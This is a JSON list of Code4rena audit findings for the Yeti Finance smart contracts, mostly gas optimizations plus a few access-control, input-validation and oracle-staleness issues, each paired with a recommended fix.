[{"title": "Debug code left over in WJLP.unwrapFor", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/106", "labels": ["bug", "disagree with severity", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  hyh   # Vulnerability details  Console log code to be removed: https://github.com/code-423n4/2021-12-yetifinance/blob/main/packages/contracts/contracts/AssetWrappers/WJLP/WJLP.sol#L152  "}, {"title": "WJLP setAddresses initialization can be front run", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/105", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  hyh   # Vulnerability details  # Impact  WJLP set configuration variables via setAddresses initialize function that has no access controls, so whenever it is being run not atomically with contract creation it can be front run by an attacker. The fix is to redeploy the contracts.  ## Proof of Concept  WJLP.setAddresses: https://github.com/code-423n4/2021-12-yetifinance/blob/main/packages/contracts/contracts/AssetWrappers/WJLP/WJLP.sol#L102  WJLP.constructor: https://github.com/code-423n4/2021-12-yetifinance/blob/main/packages/contracts/contracts/AssetWrappers/WJLP/WJLP.sol#L82  ## Recommended Mitigation Steps  a. Either set access rights in the constructor and restrict initialize access b. Or run setAddresses atomically along with contract construction each time  It is also advised to check for zero addressed supplied by a caller both in constructor and setAddresses. Misconfiguration with zero address also leads to redeployment.  "}, {"title": "Checking zero address on msg.sender is impractical", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/103", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  dalgarim   # Vulnerability details  ## Impact sYETIToken.sol mint function checks if msg.sender is zero address. It is extremely unlikely that someone possesses a private key of zero address. This 'require' statement semantically has no meaning  ## Proof of Concept [mint](https://github.com/code-423n4/2021-12-yetifinance/blob/main/packages/contracts/contracts/YETI/sYETIToken.sol#L175) ``` function mint(uint256 amount) public returns (bool) {         require(msg.sender != address(0), \"Zero address\");         User memory user = users[msg.sender];          uint256 shares = totalSupply == 0 ? amount : (amount * totalSupply) / effectiveYetiTokenBalance;         user.balance += shares.to128();         user.lockedUntil = (block.timestamp + LOCK_TIME).to128();         users[msg.sender] = user;         totalSupply += shares;          yetiToken.sendToSYETI(msg.sender, amount);         effectiveYetiTokenBalance = effectiveYetiTokenBalance.add(amount);          emit Transfer(address(0), msg.sender, shares);         return true;     } ```  ## Tools Used Manual  ## Recommended Mitigation Steps The require statement can be removed  "}, {"title": "uint is always >= 0", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/102", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  Jujic   # Vulnerability details  ## Impact The uint   `percentBacked ` can not  be negative.  ## Proof of Concept https://github.com/code-423n4/2021-12-yetifinance/blob/5f5bf61209b722ba568623d8446111b1ea5cb61c/packages/contracts/contracts/PriceCurves/ThreePieceWiseLinearPriceCurve.sol#L131 ``` uint256 percentBacked = _collateralVCBalance.mul(1e18).div(_totalVCBalance); require(percentBacked <= 1e18 && percentBacked >= 0, \"percent backed out of bounds\"); ```  ## Tools Used Remix  ## Recommended Mitigation Steps You should remove the `percentBacked >= 0` from require to save some gas.  "}, {"title": "sYETIToken rebase comment should be 'added is not more than repurchased'", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/100", "labels": ["bug", "1 (Low Risk)", "disagree with severity", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  hyh   # Vulnerability details  # Impact  Comment is misleading, now stating the opposite of the implemented logic.  ## Proof of Concept  Comment states that tokens added are `not less than amount repurchased`, while it should be `not more`: https://github.com/code-423n4/2021-12-yetifinance/blob/main/packages/contracts/contracts/YETI/sYETIToken.sol#L246   ## Recommended Mitigation Steps  Now: ``` // Ensure that the amount of YETI tokens effectively added is >= the amount we have repurchased. if (yetiTokenBalance < additionalYetiTokenBalance) {   additionalYetiTokenBalance = yetiTokenBalance; } ```  To be: ``` // Ensure that the amount of YETI tokens effectively added is <= the amount we have repurchased. if (yetiTokenBalance < additionalYetiTokenBalance) {   additionalYetiTokenBalance = yetiTokenBalance; } ```  "}, {"title": "BorrowerOperations has unused pieces of functionality", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/99", "labels": ["bug", "0 (Non-critical)", "disagree with severity", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  hyh   # Vulnerability details  ## Proof of Concept  _requireValidRouterParams and _requireRouterAVAXIndicesInOrder functions along with IYetiRouter interface are unused:  _requireValidRouterParams https://github.com/code-423n4/2021-12-yetifinance/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L1053  _requireRouterAVAXIndicesInOrder https://github.com/code-423n4/2021-12-yetifinance/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L1067  IYetiRouter import and the interface itself: https://github.com/code-423n4/2021-12-yetifinance/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L12 https://github.com/code-423n4/2021-12-yetifinance/blob/main/packages/contracts/contracts/Interfaces/IYetiRouter.sol  ## Recommended Mitigation Steps  If it is not meant to be implemented further consider removal to enhance code readability and size  "}, {"title": "BorrowerOperations.withdrawColl doesn't check the length of the caller supplied arrays", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/96", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  hyh   # Vulnerability details  # Impact  On calling with arrays of different lengths various malfunctions are possible as the arrays are used as given. `withdrawColl` outcome will not be as expected by a caller.  ## Proof of Concept  `_adjustTrove` doesn't check for array lengths and all other array providing usages of this function do check them before usage.  BorrowerOperations.withdrawColl doesn't: https://github.com/code-423n4/2021-12-yetifinance/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L373  ## Recommended Mitigation Steps  Add the check:  Now: ``` params._collsOut = _collsOut; params._amountsOut = _amountsOut; ```  To be: ``` require(_collsOut.length == _amountsOut.length); params._collsOut = _collsOut; params._amountsOut = _amountsOut; ```   "}, {"title": "Consider making some constants as non-public to save gas", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/95", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  Jujic   # Vulnerability details  ## Impact Each function part of contract's external interface is part of the function dispatch, i.e., every time a contract is called, it goes through a switch statement (a set of eq ... JUMPI blocks in EVM) matching the selector of each externally available functions with the chosen function selector (the first 4 bytes of calldata). This means that any unnecessary function that is part of contract's external interface will lead to more gas for (almost) every single function calls to the contract. There are several cases where constants were made public. This is unnecessary; the constants can simply be readfrom the verified contract, i.e., it is unnecessary to expose it with a public function.  ## Proof of Concept https://github.com/code-423n4/2021-12-yetifinance/blob/5f5bf61209b722ba568623d8446111b1ea5cb61c/packages/contracts/contracts/TroveManagerRedemptions.sol#L53-L55  https://github.com/code-423n4/2021-12-yetifinance/blob/5f5bf61209b722ba568623d8446111b1ea5cb61c/packages/contracts/contracts/TroveManager.sol#L35-L39   Example: ``` uint256 public constant BOOTSTRAP_PERIOD = 14 days; ``` ## Tools Used Remix ## Recommended Mitigation Steps  "}, {"title": "SHOULD CHECK RETURN DATA FROM CHAINLINK AGGREGATORS", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/91", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  defsec   # Vulnerability details  ## Impact  The latestRoundData function in the contract PriceFeed.sol fetches the asset price from a Chainlink aggregator using the latestRoundData function. However, there are no checks on roundID.  Stale prices could put funds at risk. According to Chainlink's documentation, This function does not error if no answer has been reached but returns 0, causing an incorrect price fed to the PriceOracle. The external Chainlink oracle, which provides index price information to the system, introduces risk inherent to any dependency on third-party data sources. For example, the oracle could fall behind or otherwise fail to be maintained, resulting in outdated data being fed to the index price calculations of the liquidity.  Example Medium Issue : https://github.com/code-423n4/2021-08-notional-findings/issues/18  ## Proof of Concept  1. Navigate to the following contract.  \"https://github.com/code-423n4/2021-12-yetifinance/blob/1da782328ce4067f9654c3594a34014b0329130a/packages/contracts/contracts/PriceFeed.sol#L578\"  2. Only the following checks are implemented.  ```         if (!_response.success) {return true;}         // Check for an invalid roundId that is 0         if (_response.roundId == 0) {return true;}         // Check for an invalid timeStamp that is 0, or in the future         if (_response.timestamp == 0 || _response.timestamp > block.timestamp) {return true;}         // Check for non-positive price         if (_response.answer <= 0) {return true;}   ```  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  Consider to add checks on the return data with proper revert messages if the price is stale or the round is incomplete, for example:  ``` (uint80 roundID, int256 price, , uint256 timeStamp, uint80 answeredInRound) = ETH_CHAINLINK.latestRoundData(); require(price > 0, \"Chainlink price <= 0\");  require(answeredInRound >= roundID, \"...\"); require(timeStamp != 0, \"...\"); ```  "}, {"title": "Delete - ABI Coder V2 For Gas Optimization", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/89", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  defsec   # Vulnerability details  ## Impact  From Pragma 0.8.0, ABI coder v2 is activated by default. The pragma abicoder v2 can be deleted from the repository. That will provide gas optimization.  ## Proof of Concept  1. The following contract is using ABI coder v2.  \"https://github.com/code-423n4/2021-12-yetifinance/blob/1da782328ce4067f9654c3594a34014b0329130a/packages/contracts/contracts/YETI/sYETIToken.sol#L3\"   ## Tools Used  None  ## Recommended Mitigation Steps  Upgrade pragma to 0.8.0  and After the 0.8.0, ABI coder v2 is activated by default. Upgrade pragma to 0.8.0 version. It is recommended to delete redundant codes.  From Solidity v0.8.0 Breaking Changes https://docs.soliditylang.org/en/v0.8.0/080-breaking-changes.html  "}, {"title": "A variable is being assigned its default value which is unnecessary.", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/87", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  Jujic   # Vulnerability details  ## Impact Removing the assignment will save gas. ``` _totalSupply = 0; ```  ## Proof of Concept https://github.com/code-423n4/2021-12-yetifinance/blob/5f5bf61209b722ba568623d8446111b1ea5cb61c/packages/contracts/contracts/AssetWrappers/WJLP/WJLP.sol#L93  ## Tools Used  ## Recommended Mitigation Steps Remove the assignment.  "}, {"title": "Unnecessary use of Safemath", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/85", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  Jujic   # Vulnerability details  ## Impact ``` deploymentTime = block.timestamp; uint public constant BOOTSTRAP_PERIOD = 14 days;  deploymentTime.add(BOOTSTRAP_PERIOD) // doesn't overflow  ```  ## Proof of Concept https://github.com/code-423n4/2021-12-yetifinance/blob/5f5bf61209b722ba568623d8446111b1ea5cb61c/packages/contracts/contracts/BorrowerOperations.sol#L899  ## Tools Used Remix ## Recommended Mitigation Steps I recommend   not  use Safemath for this operation.  "}, {"title": "Missing events in critical functions", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/84", "labels": ["bug", "0 (Non-critical)", "disagree with severity", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  SolidityScan   # Vulnerability details  ## Impact Events are important and should be emitted for tracking this off-chain for all important functions.   ## Proof of Concept 1. The function \"updateTeamAddress\" is used to update the team's address but we can notice no event is emitted.  https://github.com/code-423n4/2021-12-yetifinance/blob/main/packages/contracts/contracts/TeamAllocation.sol#L81-L83  2. The same in function \"updateTeamWallet\" at  https://github.com/code-423n4/2021-12-yetifinance/blob/main/packages/contracts/contracts/YetiFinanceTreasury.sol#L28-L30  ## Tools Used  ## Recommended Mitigation Steps Add an event to these important functions where address updation is happening. This can also be marked as indexed event for better off-chain tracking  "}, {"title": "TellorCaller.sol constructor does not guard against zero address", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/78", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  jayjonah8   # Vulnerability details  ## Impact the constructor in TellorCaller.sol should ensure that the _tellorMasterAddress arg passed in is not a zero address as a safegaurd.  ## Proof of Concept https://github.com/code-423n4/2021-12-yetifinance/blob/main/packages/contracts/contracts/Dependencies/TellorCaller.sol#L24  ## Tools Used Manual code review   ## Recommended Mitigation Steps require(address(_tellorMasterAddress) != address(0), \"Zero address\")  "}, {"title": "receiveCollateral() can be called by anyone", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/74", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  jayjonah8   # Vulnerability details  ## Impact In StabilityPool.sol, the receiveCollateral() function should be called by ActivePool per comments,  but anyone can call it passing in _tokens and _amounts args to update stability pool balances.   ## Proof of Concept https://github.com/code-423n4/2021-12-yetifinance/blob/main/packages/contracts/contracts/StabilityPool.sol#L1143  ## Tools Used Manual code review   ## Recommended Mitigation Steps Allow only the ActivePool to call the receiveCollateral() function: require(msg.sender = address(active pool address), \"Can only be called by ActivePool\")  "}, {"title": "Useless imports", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/72", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  Jujic   # Vulnerability details  ## Impact contract WJLP does not need to import this contract in production ``` import \"hardhat/console.sol\"; ```  ## Proof of Concept https://github.com/code-423n4/2021-12-yetifinance/blob/5f5bf61209b722ba568623d8446111b1ea5cb61c/packages/contracts/contracts/AssetWrappers/WJLP/WJLP.sol#L8  https://github.com/code-423n4/2021-12-yetifinance/blob/5f5bf61209b722ba568623d8446111b1ea5cb61c/packages/contracts/contracts/AssetWrappers/WJLP/WJLP.sol#L152-L160  ## Tools Used Remix  ## Recommended Mitigation Steps Remove this contract  to reduce the size of the contract and thus save some deployment gas.  "}, {"title": "Caching variables", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/70", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  Jujic   # Vulnerability details  ## Impact Some of the variable can be cached to slightly reduce gas usage  ## Proof of Concept https://github.com/code-423n4/2021-12-yetifinance/blob/5f5bf61209b722ba568623d8446111b1ea5cb61c/packages/contracts/contracts/PriceCurves/ThreePieceWiseLinearPriceCurve.sol#L90-L91  https://github.com/code-423n4/2021-12-yetifinance/blob/5f5bf61209b722ba568623d8446111b1ea5cb61c/packages/contracts/contracts/PriceCurves/ThreePieceWiseLinearPriceCurve.sol#L107-L108  https://github.com/code-423n4/2021-12-yetifinance/blob/5f5bf61209b722ba568623d8446111b1ea5cb61c/packages/contracts/contracts/PriceCurves/ThreePieceWiseLinearPriceCurve.sol#L144-L145  ``` dollarCap // can be cashed decayTime // can be cashed  ``` ## Tools Used Remix  ## Recommended Mitigation Steps   "}, {"title": "Wrapped Joe LP token Contract  JLP token variable is set on initialization, doesn't change afterwards and should be immutable", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/69", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  Jujic   # Vulnerability details  ## Impact ``` IERC20 public immutable JLP; IERC20 public  immutable JOE; ```  ## Proof of Concept https://github.com/code-423n4/2021-12-yetifinance/blob/5f5bf61209b722ba568623d8446111b1ea5cb61c/packages/contracts/contracts/AssetWrappers/WJLP/WJLP.sol#L41-L44  ## Tools Used REmix ## Recommended Mitigation Steps  "}, {"title": "Use of Large Number Literals", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/64", "labels": ["bug", "0 (Non-critical)", "disagree with severity", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  SolidityScan   # Vulnerability details  ### Description  Integer literals are formed from a sequence of digits in the range 0-9. They are interpreted as decimals. The use of very large numbers with too many digits was detected in the code that could have been optimized using a different notation also supported by Solidity.  ## Impact Literals with many digits are difficult to read and review. This may also introduce errors in the future if one of the zeroes is omitted while doing code modifications.   ## Proof of Concept 1.  uint constant public _100pct = 1000000000000000000;  https://github.com/code-423n4/2021-12-yetifinance/blob/main/packages/contracts/contracts/Dependencies/LiquityBase.sol#L19  2. uint constant public _110pct = 1100000000000000000; // 1.1e18 == 110%  https://github.com/code-423n4/2021-12-yetifinance/blob/main/packages/contracts/contracts/Dependencies/LiquityBase.sol#L21  3. uint constant public MCR = 1100000000000000000; // 110%  https://github.com/code-423n4/2021-12-yetifinance/blob/main/packages/contracts/contracts/Dependencies/LiquityBase.sol#L24  4. uint constant public CCR = 1500000000000000000; // 150% https://github.com/code-423n4/2021-12-yetifinance/blob/main/packages/contracts/contracts/Dependencies/LiquityBase.sol#L27  ## Tools Used  ## Recommended Mitigation Steps Scientific notation in the form of\u00a02e10\u00a0is also supported, where the mantissa can be fractional but the exponent has to be an integer. The literal\u00a0MeE\u00a0is equivalent to\u00a0M\u00a0*\u00a010**E. Examples include\u00a02e10,\u00a02e10,\u00a02e-10,\u00a02.5e1. As suggested in official docs https://docs.soliditylang.org/en/latest/types.html#rational-and-integer-literals  "}, {"title": "Unused functions can be removed to save gas", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/63", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  SolidityScan   # Vulnerability details  ### Description  Smart Contracts are Gas sensitive and heavily depend on how Gas is spent and managed across the code. This affects each and every function definition and logic.   Therefore having any unused functions in the code cost unnecessary Gas usage and thus negatively impacts the Contract and the organization.  ## Impact Having unused function definitions and parameters negatively affects the contract and costs unnecessary Gas. This also makes it difficult and confusing for auditors to go through the code.  ## Proof of Concept The function \"_getColls\" is not used anywhere in the code  https://github.com/code-423n4/2021-12-yetifinance/blob/main/packages/contracts/contracts/Dependencies/LiquityBase.sol#L146-L153  ## Tools Used  ## Recommended Mitigation Steps Evaluate if the function call should be used anywhere otherwise remove the function definition.  "}, {"title": "WJLP.sol does not make use of important events to emit ", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/62", "labels": ["bug", "0 (Non-critical)", "disagree with severity", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  jayjonah8   # Vulnerability details  ## Impact There are no events emitted in the WJLP.sol file for important function calls.  The contract should make use of events for important functions like claimReward() so the protocol can track important events after deployment.  This can help spot unusual activity and assist in monitoring the protocol while its live.    ## Proof of Concept https://github.com/code-423n4/2021-12-yetifinance/blob/main/packages/contracts/contracts/AssetWrappers/WJLP/WJLP.sol#L215  ## Tools Used Manual code review     "}, {"title": "_from and _to can be the same address on wrap() function", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/58", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  jayjonah8   # Vulnerability details  ## Impact In WJLP.sol, the wrap() function pulls in _amount base tokens from _from, then stakes them to mint WAssets which it sends to _to.  It then updates _rewardOwner's reward tracking such that it now has the right to future yields from the newly minted WAssets.  But the function does not make sure that _from and _to are not the same address and failure to make this check in functions with transfer functionality has lead to severe bugs in other protocols since users rewards are updated on such transfers this can be used to manipulate the system.   ## Proof of Concept https://github.com/code-423n4/2021-12-yetifinance/blob/main/packages/contracts/contracts/AssetWrappers/WJLP/WJLP.sol#L126  https://medium.com/@Knownsec_Blockchain_Lab/knownsec-blockchain-lab-i-kill-myself-monox-finance-security-incident-analysis-2dcb4d5ac8f   ## Tools Used Manual code review   ## Recommended Mitigation Steps require(address(_from) != address(_to), \"_from and _to cannot be the same\")  "}, {"title": "Must approve 0 first", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/18", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  robee   # Vulnerability details  Some tokens (like USDT) do not work when changing the allowance from an existing non-zero allowance value.They must first be approved by zero and then the actual allowance must be approved.  You don't first approve 0 in the following places in the codebase:           approve without approving 0 first WJLP.sol, 127, JLP.approve(address(_MasterChefJoe), _amount);          approve without approving 0 first EchidnaProxy.sol, 134, return yusdToken.approve(spender, amount);          approve without approving 0 first sYETIToken.sol, 229, yusdToken.approve(routerAddress, YUSDToSell);   "}, {"title": "Prefix increments are cheaper than postfix increments", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/12", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  robee   # Vulnerability details  Prefix increments are cheaper than postfix increments.  Further more, using unchecked {++x} is even more gas efficient, and the gas saving accumulates every iteration and can make a real change There is no risk of overflow caused by increamenting the iteration index in for loops (the `++i` in `for (uint256 i = 0; i < numIterations; ++i)`). But increments perform overflow checks that are not necessary in this case. These functions use not using prefix increments (`++x`) or not using the unchecked keyword:           change to prefix increment and unchecked: ActivePool.sol, i, 133         change to prefix increment and unchecked: ActivePool.sol, i, 167         change to prefix increment and unchecked: ActivePool.sol, i, 184         change to prefix increment and unchecked: BorrowerOperations.sol, i, 699         change to prefix increment and unchecked: BorrowerOperations.sol, i, 737         change to prefix increment and unchecked: BorrowerOperations.sol, i, 873         change to prefix increment and unchecked: BorrowerOperations.sol, i, 890         change to prefix increment and unchecked: BorrowerOperations.sol, i, 920         change to prefix increment and unchecked: BorrowerOperations.sol, i, 929         change to prefix increment and unchecked: BorrowerOperations.sol, i, 1061         change to prefix increment and unchecked: BorrowerOperations.sol, i, 1068         change to prefix increment and unchecked: DefaultPool.sol, i, 97         change to prefix increment and unchecked: DefaultPool.sol, i, 133         change to prefix increment and unchecked: LiquityBase.sol, i, 63         change to prefix increment and unchecked: LiquityBase.sol, i, 97         change to prefix increment and unchecked: LiquityBase.sol, i, 106         change to prefix increment and unchecked: LiquityBase.sol, i, 115         change to prefix increment and unchecked: LiquityBase.sol, i, 149         change to prefix increment and unchecked: LiquityBase.sol, i, 158         change to prefix increment and unchecked: LiquityBase.sol, i, 168         change to prefix increment and unchecked: YetiCustomBase.sol, i, 36         change to prefix increment and unchecked: YetiCustomBase.sol, i, 44         change to prefix increment and unchecked: YetiCustomBase.sol, i, 59         change to prefix increment and unchecked: YetiCustomBase.sol, i, 104         change to prefix increment and unchecked: YetiCustomBase.sol, i, 122         change to prefix increment and unchecked: YetiCustomBase.sol, i, 144         change to prefix increment and unchecked: YetiCustomBase.sol, i, 152         change to prefix increment and unchecked: YetiCustomBase.sol, i, 165         change to prefix increment and unchecked: YetiCustomBase.sol, i, 178         change to prefix increment and unchecked: HintHelpers.sol, i, 139         just change to unchecked: MultiTroveGetter.sol, idx, 73         just change to unchecked: MultiTroveGetter.sol, idx, 79         just change to unchecked: MultiTroveGetter.sol, idx, 90         just change to unchecked: MultiTroveGetter.sol, idx, 96         change to prefix increment and unchecked: MultiTroveGetter.sol, i, 110         change to prefix increment and unchecked: StabilityPool.sol, i, 562         change to prefix increment and unchecked: StabilityPool.sol, i, 588         change to prefix increment and unchecked: StabilityPool.sol, i, 592         change to prefix increment and unchecked: StabilityPool.sol, i, 628         change to prefix increment and unchecked: StabilityPool.sol, i, 720         change to prefix increment and unchecked: StabilityPool.sol, i, 942         change to prefix increment and unchecked: StabilityPool.sol, i, 1011         change to prefix increment and unchecked: TeamAllocation.sol, i, 66         change to prefix increment and unchecked: CDPManagerTester.sol, i, 14         change to prefix increment and unchecked: EchidnaTester.sol, i, 103         change to prefix increment and unchecked: EchidnaTester.sol, i, 121         change to prefix increment and unchecked: TroveManager.sol, i, 234         change to prefix increment and unchecked: TroveManager.sol, i, 348         change to prefix increment and unchecked: TroveManager.sol, i, 374         change to prefix increment and unchecked: TroveManager.sol, i, 397         change to prefix increment and unchecked: TroveManager.sol, i, 420         change to prefix increment and unchecked: TroveManager.sol, i, 460         change to prefix increment and unchecked: TroveManager.sol, i, 476         change to prefix increment and unchecked: TroveManager.sol, i, 525         change to prefix increment and unchecked: TroveManager.sol, i, 582         change to prefix increment and unchecked: TroveManager.sol, i, 603         change to prefix increment and unchecked: TroveManagerLiquidations.sol, vars.i, 255         change to prefix increment and unchecked: TroveManagerLiquidations.sol, vars.i, 334         change to prefix increment and unchecked: TroveManagerLiquidations.sol, i, 394         change to prefix increment and unchecked: TroveManagerLiquidations.sol, i, 475         change to prefix increment and unchecked: TroveManagerLiquidations.sol, i, 808         change to prefix increment and unchecked: TroveManagerLiquidations.sol, i, 840         change to prefix increment and unchecked: TroveManagerRedemptions.sol, i, 304         change to prefix increment and unchecked: TroveManagerRedemptions.sol, i, 517  "}, {"title": "Unnecessary array boundaries check when loading an array element twice", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/11", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  robee   # Vulnerability details  There are places in the code (especially in for-each loops) that loads the same array element more than once. In such cases, only one array boundaries check should take place, and the rest are unnecessary. Therefore, this array element should be cached in a local variable and then be loaded  again using this local variable, skipping the redundent second array boundaries check:           BorrowerOperations.sol, variable name: _colls times: 2 at: _requireNoDuplicateColls         BorrowerOperations.sol, variable name: _indices times: 2 at: _requireRouterAVAXIndicesInOrder         DefaultPool.sol, variable name: _amounts times: 2 at: sendCollsToActivePool         YetiCustomBase.sol, variable name: _amounts times: 2 at: _subColls         StabilityPool.sol, variable name: amounts times: 2 at: _sendGainsToDepositor         TroveManager.sol, variable name: lastCollError_Redistribution times: 2 at: redistributeDebtAndColl         TroveManager.sol, variable name: lastYUSDDebtError_Redistribution times: 2 at: redistributeDebtAndColl         TroveManager.sol, variable name: totalStakes times: 2 at: redistributeDebtAndColl         TroveManager.sol, variable name: allColls times: 2 at: _closeTrove    "}, {"title": "Storage double reading. Could save SLOAD", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/8", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  robee   # Vulnerability details  Reading a storage variable is gas costly (SLOAD). In cases of multiple read of a storage variable in the same scope, caching the first read (i.e saving as a local variable) can save gas and decrease the  overall gas uses. The following is a list of functions and the storage variables that you read twice:           WJLP.sol Variable activePool is read 2 times in the function: unwrapFor         WJLP.sol Variable stabilityPool is read 2 times in the function: unwrapFor         Pool2Unipool.sol Variable periodFinish is read 2 times in the function: _notifyRewardAmount         Pool2Unipool.sol Variable periodFinish is read 2 times in the function: _updatePeriodFinish         Unipool.sol Variable periodFinish is read 2 times in the function: _notifyRewardAmount         Unipool.sol Variable periodFinish is read 2 times in the function: _updatePeriodFinish         PriceFeed.sol Variable lastGoodPrice is read 17 times in the function: fetchPrice         PriceFeed.sol Variable lastGoodPrice is read 17 times in the function: fetchPrice_v         EchidnaTester.sol Variable troveManager is read 9 times in the function: constructor         EchidnaTester.sol Variable borrowerOperations is read 8 times in the function: constructor         EchidnaTester.sol Variable activePool is read 6 times in the function: constructor         EchidnaTester.sol Variable defaultPool is read 4 times in the function: constructor         EchidnaTester.sol Variable stabilityPool is read 6 times in the function: constructor         EchidnaTester.sol Variable gasPool is read 3 times in the function: constructor         EchidnaTester.sol Variable troveManagerLiquidations is read 4 times in the function: constructor         EchidnaTester.sol Variable troveManagerRedemptions is read 5 times in the function: constructor         EchidnaTester.sol Variable yusdToken is read 5 times in the function: constructor         EchidnaTester.sol Variable whitelist is read 4 times in the function: constructor         EchidnaTester.sol Variable collSurplusPool is read 4 times in the function: constructor         EchidnaTester.sol Variable priceFeedTestnet is read 3 times in the function: constructor         EchidnaTester.sol Variable sortedTroves is read 4 times in the function: constructor         EchidnaTester.sol Variable MCR is read 2 times in the function: constructor         EchidnaTester.sol Variable CCR is read 2 times in the function: constructor         ERC20.sol Variable totalSupply is read 2 times in the function: _mint         TeamLockup.sol Variable totalClaimed is read 2 times in the function: claimYeti         YETIToken.sol Variable _totalSupply is read 2 times in the function: constructor   "}, {"title": "Short the following require messages", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/7", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  robee   # Vulnerability details  The following require messages are of length more than 32 and we think are short enough to short them into exactly 32 characters such that it will be placed in one slot of memory and the require  function will cost less gas.  The list:           Solidity file: ActivePool.sol, In line 252, Require message length to shorten: 35, The message: ActivePool: Caller is not whitelist         Solidity file: BorrowerOperations.sol, In line 215, Require message length to shorten: 39, The message: BOps: colls and amounts length mismatch         Solidity file: BorrowerOperations.sol, In line 874, Require message length to shorten: 33, The message: BOps: Collateral not in whitelist         Solidity file: CollSurplusPool.sol, In line 167, Require message length to shorten: 40, The message: CollSurplusPool: Caller is not Whitelist         Solidity file: DefaultPool.sol, In line 122, Require message length to shorten: 38, The message: DefaultPool: sending collateral failed         Solidity file: DefaultPool.sol, In line 167, Require message length to shorten: 36, The message: DefaultPool: Caller is not whitelist         Solidity file: LiquitySafeMath128.sol, In line 10, Require message length to shorten: 37, The message: LiquitySafeMath128: addition overflow         Solidity file: LiquitySafeMath128.sol, In line 16, Require message length to shorten: 40, The message: LiquitySafeMath128: subtraction overflow         Solidity file: SafeMath.sol, In line 87, Require message length to shorten: 33, The message: SafeMath: multiplication overflow         Solidity file: Address.sol, In line 115, Require message length to shorten: 38, The message: Address: insufficient balance for call         Solidity file: Address.sol, In line 140, Require message length to shorten: 36, The message: Address: static call to non-contract         Solidity file: SortedTroves.sol, In line 131, Require message length to shorten: 34, The message: SortedTroves: ICR must be positive         Solidity file: 